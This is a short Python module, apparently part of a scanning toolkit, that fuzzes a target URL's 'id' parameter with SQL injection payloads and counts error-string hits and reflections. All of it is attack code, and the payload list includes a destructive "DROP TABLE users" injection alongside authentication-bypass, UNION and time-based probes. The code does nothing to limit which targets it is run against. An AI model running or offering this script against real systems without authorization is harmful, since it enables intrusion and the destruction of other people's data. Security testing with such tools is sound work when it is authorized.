import requests

def run(target):
    payloads = [
        "' OR 1=1 --",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL, NULL, NULL --",
        "' OR 'a'='a",
        "' OR sleep(5) --"
    ]

    reflections = 0
    hits = 0
    sent = 0

    for payload in payloads:
        try:
            url = f"{target}?id={payload}"
            r = requests.get(url, timeout=6)
            sent += 1
            if "sql" in r.text.lower() or "syntax" in r.text.lower() or "mysql" in r.text.lower():
                hits += 1
            if payload in r.text:
                reflections += 1
        except:
            continue

    return {
        "module": "fuzz_sql",
        "payloads_sent": sent,
        "reflections": reflections,
        "hits": hits,
        "notes": "Basic SQLi test"
    }
